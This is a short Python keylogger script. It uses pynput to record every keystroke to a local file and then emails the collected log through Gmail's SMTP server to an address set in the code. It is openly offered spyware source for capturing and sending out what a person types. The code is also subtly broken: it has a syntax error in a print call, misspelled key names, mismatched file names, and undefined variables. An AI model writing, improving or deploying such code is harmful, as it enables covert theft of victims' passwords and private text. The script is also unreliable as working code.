from pynput import keyboard
import smtplib, ssl
sender_mail = "user@admin.com" # Replace user@domain.com with your email id (everywhere)
#prefer using your own email id for receiver's as well.
receiver_mail = "user@domain.com" # Replace user@domain.com with your email id (everywhere)
password = "passcode"  # Enter your Password here
port = "port_no." # Enter any port number here
message = """From: user@admin.com
To: user@domain.com
subject: keylogs


Text: keylogs
"""
def write(text):
    with open("keylogger.txt",'a') as f:
        f.write(text)
        f.close()

def on_key_press(key):
    try:
        if(key == keyboard.key.enter):
            write("\n") 
        else:
            write(key.char)
    except AttributeError:
        if key == keyboard.key.backspace:
            write("\nBackspace Pressed\n")
        elif(key == keyboard.key.tab):
            write("\nTab Pressed")
        elif(key == keyboard.key.space):
            write(" ")
        else:
            temp = repr(key)+" Pressed.\n"
            write(temp)
            print("\n{} Pressed\n",.format(key))

def on_key_release(key):
    #This stops the Listener/Keylogger.
    #You can use any key you like by replacing "esc" with the key of your choice
    if (key == keyboard.key.ese):
        return False
    
with keyboard.Listener(on_press= on_key_press, on_release= on_key_release) as listener:
    listener.join()

with open("keylogger.text",'r') as f:
    temp = f.read()
    message = message + str(temp)
    f.close()


context = ssl.create_default_context()
server =smtplib.SMTP('smtp.gmail.com', port)
server.starttls()
server.login(sender_mail, Password)
server.sendmail(sender_mail,receiver_mail,message)
print("Email sent to ", sender_mail)
sender.quit()


         

